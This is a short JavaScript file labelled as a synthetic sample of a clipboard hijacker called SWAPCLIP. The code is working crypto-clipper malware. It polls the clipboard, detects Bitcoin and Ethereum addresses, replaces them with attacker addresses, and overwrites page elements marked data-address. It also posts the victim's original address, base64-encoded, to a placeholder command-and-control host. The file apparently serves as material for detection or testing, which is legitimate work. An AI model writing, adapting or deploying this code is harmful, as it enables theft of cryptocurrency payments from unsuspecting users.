// SWAPCLIP — synthetic clipboard hijacker product sample.
(function () {
  var C2 = 'https://c2.example.test/clip';
  var ATTACKER = {
    btc: '1BoatSLRHtKNngkdXEeobR76b53LETtpyT',
    eth: '0x000000000000000000000000000000000000dEaD'
  };
  var patterns = {
    btc: /\b[13][a-km-zA-HJ-NP-Z1-9]{25,34}\b/,
    eth: /\b0x[a-fA-F0-9]{40}\b/
  };
  var replaced = 0;
  console.log('[SWAPCLIP] watcher online', C2);

  function report(kind, victim) {
    replaced += 1;
    try {
      fetch(C2, { method: 'POST', body: btoa(JSON.stringify({ kind: kind, victim: victim, count: replaced })) }).catch(function () {});
    } catch (error) {}
    try { localStorage.setItem('swapclip:count', String(replaced)); } catch (error) {}
  }

  function inspect(text) {
    if (typeof text !== 'string' || text.length === 0) return false;
    if (patterns.eth.test(text)) {
      report('eth', text);
      try { navigator.clipboard.writeText(ATTACKER.eth); } catch (error) {}
      return true;
    }
    if (patterns.btc.test(text)) {
      report('btc', text);
      try { navigator.clipboard.writeText(ATTACKER.btc); } catch (error) {}
      return true;
    }
    return false;
  }

  var rounds = 0;
  function poll() {
    rounds += 1;
    try {
      if (navigator.clipboard && navigator.clipboard.readText) {
        navigator.clipboard.readText().then(inspect, function () {});
      }
    } catch (error) {}
    if (rounds < 5) setTimeout(poll, 200);
  }
  poll();

  // Replace visible receive addresses on the page.
  try {
    var nodes = document.querySelectorAll('[data-address]');
    for (var index = 0; index < nodes.length; index += 1) nodes[index].textContent = ATTACKER.eth;
  } catch (error) {}
  inspect('0x1111111111111111111111111111111111111111');
})();
